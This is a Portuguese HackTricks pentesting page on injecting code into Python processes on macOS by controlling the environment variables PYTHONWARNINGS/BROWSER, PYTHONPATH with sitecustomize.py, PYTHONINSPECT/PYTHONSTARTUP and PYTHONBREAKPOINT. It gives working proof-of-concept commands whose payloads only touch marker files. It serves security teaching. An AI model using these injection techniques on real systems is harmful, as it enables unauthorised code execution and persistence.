# Injeção em aplicações Python no macOS

{{#include ../../../banners/hacktricks-training.md}}

## Por meio das variáveis de ambiente `PYTHONWARNINGS` e `BROWSER`

Se um invasor puder controlar o ambiente de um processo Python, a combinação de `PYTHONWARNINGS` e `BROWSER` poderá acionar a execução de comandos quando o Python importar o módulo `antigravity` ao processar uma opção de aviso criada para esse fim. A técnica depende de `antigravity` abrir uma URL com o módulo `webbrowser` do Python, que respeita a variável de ambiente `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Via `PYTHONPATH` e `sitecustomize.py`

Durante a inicialização normal, o módulo `site` do Python adiciona caminhos específicos do site e, em seguida, tenta importar um módulo chamado `sitecustomize`. Ao colocar um diretório legível pelo atacante no início de `PYTHONPATH`, um atacante que controla o ambiente do processo pode fazer o Python importar um payload antes do script-alvo. A flag `-S` desativa a inicialização automática de `site`, enquanto o modo isolado (`-I`) ignora `PYTHONPATH` e implica `-s` e `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Para persistência por meio de um site de usuário gravável, em vez de um `PYTHONPATH` herdado, consulte [arquivos de inicialização Python `.pth`, `.start` e `usercustomize`](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Via `PYTHONINSPECT` e `PYTHONSTARTUP` após um script

No CPython 3.13+, um script iniciado com `PYTHONINSPECT=1` entra em uma sessão interativa quando termina. Se a entrada padrão for um terminal e o PyREPL estiver disponível, essa sessão executa o arquivo indicado por `PYTHONSTARTUP` **após** o script-alvo e antes do prompt. Portanto, um atacante que controle ambas as variáveis herdadas e um arquivo de inicialização legível pode executar código no processo-alvo sem modificar seu script. Este é um gatilho pós-script, não um hook de inicialização normal.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

A cadeia não executa o arquivo de inicialização em versões antigas do CPython, quando a entrada padrão não está conectada a um terminal ou quando `PYTHON_BASIC_REPL` força o REPL básico. `-E` e `-I` ignoram as variáveis `PYTHON*`. Verifique o interpretador e o contexto do terminal reais antes de confiar nesse caminho.<sup>[[3]](#references)[[5]](#references)</sup>

## Via `PYTHONBREAKPOINT`

Desde o Python 3.7 (PEP 553), a função interna `breakpoint()` importa e chama o que quer que `sys.breakpointhook` aponte, e esse destino é definido pela variável de ambiente **`PYTHONBREAKPOINT`** (`package.module.callable`). Tanto a importação do módulo indicado quanto a chamada do callable são executadas antes de o depurador normalmente aparecer. Portanto, um atacante que controla o ambiente de um processo que chega a um `breakpoint()` (algo comum em scripts de manutenção/depuração e que às vezes permanece em caminhos de produção) obtém execução de código.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Ao contrário de `PYTHONWARNINGS`/`PYTHONPATH`, isso exige que o alvo realmente alcance uma chamada a `breakpoint()`, mas também funciona apenas pelos **efeitos colaterais da importação** do módulo indicado (aponte para qualquer módulo importável — por exemplo, um colocado primeiro em `PYTHONPATH` — cujo código no nível superior seja executado). Definir `PYTHONBREAKPOINT=0` desativa completamente o hook.



## References

- [1] [Hackeando com variáveis de ambiente - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook de configuração específico do site](https://docs.python.org/3/library/site.html)
- [3] [Linha de comando e ambiente do Python](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — breakpoint() integrado e PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Despacho do REPL do interpretador CPython (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Execução do arquivo de inicialização do PyREPL do CPython (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
